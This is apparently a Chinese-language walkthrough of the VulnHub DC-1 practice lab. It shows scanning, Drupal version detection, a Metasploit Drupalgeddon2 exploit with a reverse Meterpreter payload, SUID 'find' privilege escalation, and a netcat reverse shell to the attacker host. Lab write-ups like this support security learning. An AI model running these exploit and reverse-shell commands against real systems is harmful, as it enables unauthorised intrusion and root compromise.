[TOC]



# 一、主机发现

使用netdisvocer和nmap进行主机发现。

```shell
netdiscover -r 192.168.217.0/24
```

![1554818423767](F:\学习资料\github\vulnhub-writeup\DC-1\assets\1554818423767.png)

通过上述扫描，发现192.168.217.139，应该为本次靶机

```shell
nmap -A -v 192.168.217.139
```

![1554818540536](F:\学习资料\github\vulnhub-writeup\DC-1\assets\1554818540536.png)

通过nmap端口检测，确认存在端口信息如下：

```
22 ssh端口
80 http端口 apache服务
111 rpcbind端口
```

同时通过nmap发现其中web服务存在robots.txt文件，并且猜测是drupal 7。

# 二、web渗透

首先访问web首页。

![1554818744285](F:\学习资料\github\vulnhub-writeup\DC-1\assets\1554818744285.png)

确认是drupal cms

接下来访问robots.txt

```php
User-agent: *
Crawl-delay: 10
# Directories
Disallow: /includes/
Disallow: /misc/
Disallow: /modules/
Disallow: /profiles/
Disallow: /scripts/
Disallow: /themes/
# Files
Disallow: /CHANGELOG.txt
Disallow: /cron.php
Disallow: /INSTALL.mysql.txt
Disallow: /INSTALL.pgsql.txt
Disallow: /INSTALL.sqlite.txt
Disallow: /install.php
Disallow: /INSTALL.txt
Disallow: /LICENSE.txt
Disallow: /MAINTAINERS.txt
Disallow: /update.php
Disallow: /UPGRADE.txt
Disallow: /xmlrpc.php
# Paths (clean URLs)
Disallow: /admin/
Disallow: /comment/reply/
Disallow: /filter/tips/
Disallow: /node/add/
Disallow: /search/
Disallow: /user/register/
Disallow: /user/password/
Disallow: /user/login/
Disallow: /user/logout/
# Paths (no clean URLs)
Disallow: /?q=admin/
Disallow: /?q=comment/reply/
Disallow: /?q=filter/tips/
Disallow: /?q=node/add/
Disallow: /?q=search/
Disallow: /?q=user/password/
Disallow: /?q=user/register/
Disallow: /?q=user/login/
Disallow: /?q=user/logout/
```

检查drupal的版本，访问

192.168.217.139/CHANGELOG.txt   发现不存在

192.168.217.139/UPGRADE.txt

![1554819082148](F:\学习资料\github\vulnhub-writeup\DC-1\assets\1554819082148.png)

可以通过cmseek确认版本

```
python3 cmseek.py -u http://192.168.217.139
```

![1554819614477](F:\学习资料\github\vulnhub-writeup\DC-1\assets\1554819614477.png)

可以断定是drupal 7

使用searchsploit搜一下这个版本的漏洞

```shell
searchsploit drupal 7
```

![1554819876533](F:\学习资料\github\vulnhub-writeup\DC-1\assets\1554819876533.png)

我们这里拿其中小于7.58版本的rce漏洞进行测试。

```
more /usr/share/exploitdb/exploits/php/webapps/44557.rb
```

![1554819960264](F:\学习资料\github\vulnhub-writeup\DC-1\assets\1554819960264.png)

这个漏洞是CVE-2018-7602。我们可以拿metasploit进行攻击

```shell
msfconsole
use exploit/unix/webapp/drupal_drupalgeddon2
set rhosts 192.168.217.139
set payload php/meterpreter/reverse_tcp
set lhost 192.168.217.130
set lport 4444
exploit
```

成功拿到web权限的shell

![1554820795584](F:\学习资料\github\vulnhub-writeup\DC-1\assets\1554820795584.png)

接下来，找到了flag文件，并查看其中内容

![1554820893010](F:\学习资料\github\vulnhub-writeup\DC-1\assets\1554820893010.png)

那么，下一步需要我们进行提权。

# 三、提权

首先找一下具有suid权限的应用

```shell
find / -perm -u=s -type f 2>/dev/null
```

![1554821273753](F:\学习资料\github\vulnhub-writeup\DC-1\assets\1554821273753.png)

其中/usr/bin/find具有suid权限，可以利用它来一波

首先创建一个空文件

```shell
cd /tmp
touch test
```

然后执行find命令进行提权

```
find test -exec 'whoami' \;
```

![1554821476149](F:\学习资料\github\vulnhub-writeup\DC-1\assets\1554821476149.png)

可以看到，可以直接拿到root权限。

那么我们再执行

```shell
find test -exec '/bin/sh' \;
```

![1554821540518](F:\学习资料\github\vulnhub-writeup\DC-1\assets\1554821540518.png)

提权成功，去获取flag

这里，使用当前的命令行是无法读取文件的，因此需要通过nc来转一下

```shell
攻击机
nc -nlvvp 1234
受害机
nc 192.168.217.130 1234 "/bin/bash"
```

收到反弹的shell以后，获取命令提示符

```python
python -c 'import pty;pty.spawn("/bin/bash")'
```

将上述步骤执行一遍，提权成功以后，获取flag

![1554822617060](F:\学习资料\github\vulnhub-writeup\DC-1\assets\1554822617060.png)

